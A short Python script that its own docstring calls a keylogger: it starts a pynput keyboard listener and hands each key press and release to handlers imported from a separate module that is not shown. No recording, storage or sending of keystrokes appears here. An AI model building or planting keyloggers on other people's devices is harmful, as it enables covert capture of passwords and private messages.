#! pip install pynput

from key_press_release import on_press, on_release
from pynput.keyboard import Listener


def main():
    """
    Main function to set up the keylogger listener.
    """
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()


if __name__ == "__main__":
    main()